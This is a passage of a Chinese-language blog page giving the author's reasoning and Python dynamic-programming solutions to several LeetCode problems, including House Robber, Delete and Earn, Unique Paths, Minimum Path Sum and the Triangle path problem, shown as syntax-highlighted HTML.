<span class="token keyword">def</span> <span class="token function">rob</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        prev<span class="token operator">=</span><span class="token number">0</span>        current<span class="token operator">=</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            prev<span class="token punctuation">,</span>current<span class="token operator">=</span>current<span class="token punctuation">,</span><span class="token builtin">max</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>prev<span class="token punctuation">,</span>current<span class="token punctuation">)</span>        <span class="token keyword">return</span> current<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="740-删除并获得点数"><a class="markdownIt-Anchor" href="#740-删除并获得点数"></a> <a href="https://leetcode.cn/problems/delete-and-earn/">740. 删除并获得点数</a></h3><p>给你一个整数数组 <code>nums</code> ，你可以对它进行一些操作。</p><p>每次操作中，选择任意一个 <code>nums[i]</code> ，删除它并获得 <code>nums[i]</code> 的点数。之后，你必须删除 <strong>所有</strong> 等于 <code>nums[i] - 1</code> 和 <code>nums[i] + 1</code> 的元素。</p><p>开始你拥有 <code>0</code> 个点数。返回你能通过这些操作获得的最大点数。</p><h4 id="思路-17"><a class="markdownIt-Anchor" href="#思路-17"></a> 思路</h4><p>才看题目的时候是挺懵b的，根本不知道怎么写状态方程</p><p>但实际上我们从1开始计算</p><p>会发现其实和打家劫舍是有共通点的：</p><h5 id="相同点"><a class="markdownIt-Anchor" href="#相同点"></a> 相同点</h5><ol><li>打家劫舍中是<strong>相邻的房子不能连续偷</strong>。</li><li>这个题是<strong>相邻的数字不能同时拿</strong>（拿一个相邻的就删除了。）</li></ol><h5 id="不同点"><a class="markdownIt-Anchor" href="#不同点"></a> 不同点</h5><ol><li>前者打家劫舍是有房子的金额，如果我们能够算出这个题目中的“金额”我们就能够迎刃而解。</li></ol><p>怎么算金额呢？实际上金额就是 数字i出现的次数*i</p><p>那么就可以类比写出状态方程:</p><p>f[i]=max(f[i-2]+cnt[i]*i,f[i-1])</p><p>那么这题就很清晰了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">deleteAndEarn</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        cnt<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">10010</span>        m<span class="token operator">=</span><span class="token builtin">max</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        <span class="token comment">#统计数字出现的次数</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> nums<span class="token punctuation">:</span>            cnt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">1</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">10002</span>        <span class="token comment">#特殊情况的处理</span>        dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>cnt<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">1</span>        dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">max</span><span class="token punctuation">(</span>cnt<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>cnt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>i<span class="token punctuation">)</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="矩阵"><a class="markdownIt-Anchor" href="#矩阵"></a> 矩阵</h2><h3 id="62-不同路径"><a class="markdownIt-Anchor" href="#62-不同路径"></a> <a href="https://leetcode.cn/problems/unique-paths/">62. 不同路径</a></h3><p>一个机器人位于一个 <code>m x n</code> 网格的左上角 （起始点在下图中标记为 “Start” ）。</p><p>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish” ）。</p><p>问总共有多少条不同的路径？</p><h4 id="思路-18"><a class="markdownIt-Anchor" href="#思路-18"></a> 思路</h4><p>梦回高中了，属于是</p><p>利用排列组合的知识，可以得到路径的递推关系:</p><pre class="line-numbers language-none"><code class="language-none">dp[i][j]&#x3D;dp[i-1][j]+dp[j-1][i]#dp代表（i，j）的路径数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">uniquePaths</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> m<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token comment">#生成一个二维数组,最上边的一行路径都是1</span>        <span class="token comment">#在dp里面直接把特殊情况给处理了</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>n<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进一步优化空间复杂度，把空间复杂度降到O（n）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">uniquePaths</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> m<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        cur <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> n        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>                cur<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> cur<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> cur<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="64-最小路径和"><a class="markdownIt-Anchor" href="#64-最小路径和"></a> <a href="https://leetcode.cn/problems/minimum-path-sum/">64. 最小路径和</a></h3><p>给定一个包含非负整数的 <code>*m* x *n*</code> 网格 <code>grid</code> ，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。</p><p>**说明：**每次只能向下或者向右移动一步。</p><h4 id="思路-19"><a class="markdownIt-Anchor" href="#思路-19"></a> 思路</h4><p>是上一题的加强版，稍加修改就行了</p><pre class="line-numbers language-none"><code class="language-none">dp[i][j]&#x3D;min(dp[i-1][j],dp[i][j-1])+values[i][j]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">minPathSum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> grid<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token comment">#m=Rows</span>        m<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>grid<span class="token punctuation">)</span>        <span class="token comment">#n=cols</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment">#先计算边上的:</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="63-不同路径-ii"><a class="markdownIt-Anchor" href="#63-不同路径-ii"></a> <a href="https://leetcode.cn/problems/unique-paths-ii/">63. 不同路径 II</a></h3><p>一个机器人位于一个 <code>m x n</code> 网格的左上角 （起始点在下图中标记为 “Start” ）。</p><p>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish”）。</p><p>现在考虑网格中有障碍物。那么从左上角到右下角将会有多少条不同的路径？</p><p>网格中的障碍物和空位置分别用 <code>1</code> 和 <code>0</code> 来表示。</p><h4 id="思路-20"><a class="markdownIt-Anchor" href="#思路-20"></a> 思路</h4><p>是62的plus版</p><p>障碍处理：<br />有障碍 = 此路不通 = 此格没有路线 = 此格路线数为0<br />由于初始化每一格路线数 = 0，<br />所以遇到障碍格，不更新该格即可。</p><p>我考虑直接在障碍图上进行处理</p><p>当然也可以单独开个二维表存储路线，不过有点浪费空间</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">uniquePathsWithObstacles</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obstacleGrid<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token comment">#生成一个二维数组,最上边的一行路径都是1</span>        <span class="token comment">#在dp里面直接把特殊情况给处理了</span>        m<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>obstacleGrid<span class="token punctuation">)</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>obstacleGrid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> obstacleGrid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token comment">#在障碍图的基础上填充路线</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    obstacleGrid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>                <span class="token comment">#在这里要多一些对于特殊情况的处理</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token comment">#利用dp累加路线,在这里优先级很重要</span>                    <span class="token comment">#要先判断该位置是否有障碍物然后进行处理</span>                    <span class="token comment">#if elif如果条件都满足只执行if</span>                    <span class="token keyword">if</span> obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>                        obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>                    <span class="token keyword">elif</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                        obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                    <span class="token keyword">elif</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                        obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>obstacleGrid<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>obstacleGrid<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>obstacleGrid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> obstacleGrid<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="120-三角形最小路径和"><a class="markdownIt-Anchor" href="#120-三角形最小路径和"></a> <a href="https://leetcode.cn/problems/triangle/">120. 三角形最小路径和</a></h3><p>给定一个三角形 <code>triangle</code> ，找出自顶向下的最小路径和。</p><p>每一步只能移动到下一行中相邻的结点上。<strong>相邻的结点</strong> 在这里指的是 <strong>下标</strong> 与 <strong>上一层结点下标</strong> 相同或者等于 <strong>上一层结点下标 + 1</strong> 的两个结点。也就是说，如果正位于当前行的下标 <code>i</code> ，那么下一步可以移动到下一行的下标 <code>i</code> 或 <code>i + 1</code> 。</p><h4 id="思路-21"><a class="markdownIt-Anchor" href="#思路-21"></a> 思路</h4> <pre class="line-numbers language-none"><code class="language-none">很容易可以想到状态方程如下:设坐标(i,j)dp[i][j]&#x3D;min(dp[i-1][j-1],dp[i-1][j]) #j不在两端dp[i][j]&#x3D;dp[i-1][j] #j&#x3D;0dp[i][j]&#x3D;dp[i-1][j-1] #j&#x3D;n[m]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">minimumTotal</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> triangle<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token comment">#m=Rows   n=Col</span>        m<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>triangle<span class="token punctuation">)</span>        n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment">#n是存储m行cols的列表</span>        <span class="token comment">#设置一个dp存储路径数 valueList=List</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment">#状态方程dp</span>        <span class="token comment">#先处理极端情况</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                    <span class="token keyword">elif</span> j<span class="token operator">==</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种套路题关键点就是找状态方程，以及特殊情况的处理</p><h3 id="931-下降路径最小和"><a class="markdownIt-Anchor" href="#931-下降路径最小和"></a> <a href="https://leetcode.cn/problems/minimum-falling-path-sum/">931. 下降路径最小和</a></h3><pre class="line-numbers language-none"><code class="language-none">给你一个 &#96;n x n&#96; 的 **方形** 整数数组 &#96;matrix&#96; ，请你找出并返回通过 &#96;matrix&#96; 的**下降路径** 的 **最小和** 。**下降路径** 可以从第一行中的任何元素开始，并从每一行中选择一个元素。在下一行选择的元素和当前行所选元素最多相隔一列（即位于正下方或者沿对角线向左或者向右的第一个元素）。具体来说，位置 &#96;(row, col)&#96; 的下一个元素应当是 &#96;(row + 1, col - 1)&#96;、&#96;(row + 1, col)&#96; 或者 &#96;(row + 1, col + 1)&#96; 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="思路-22"><a class="markdownIt-Anchor" href="#思路-22"></a> 思路</h4><p>有比较明显的递推关系，分解子问题，就能写出来递推关系</p><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">minFallingPathSum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> matrix<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token comment">#m=rows n=cols</span>        m<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>matrix<span class="token punctuation">)</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span 